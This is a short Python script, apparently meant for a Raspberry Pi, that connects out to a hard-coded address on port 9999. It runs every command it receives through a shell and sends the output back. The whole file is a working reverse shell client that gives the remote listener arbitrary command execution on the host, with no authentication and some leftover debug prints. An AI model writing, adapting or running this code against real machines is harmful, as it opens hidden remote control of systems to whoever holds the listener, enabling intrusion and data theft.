import socket
import os
import subprocess
import RPi.GPIO as GPIO

GPIO.setmode(GPIO.BOARD)



s=socket.socket()
host="172.16.248.218"
port=9999

s.connect((host,port))

while(True):
    print("hi")
    data=s.recv(1024)
    print("hi1")
    if(data[0:2].decode("utf-8")=="cd"):
        os.chdir(data[3:].decode("utf-8"))

    if(len(data)>0):
        cmd=subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte=cmd.stdout.read()+cmd.stderr.read()
        output_str=str(output_byte,"utf-8")
        currentWD=os.getcwd()+">"
        s.send(str.encode(output_str+currentWD))
        print('hi2')
        print(output_str)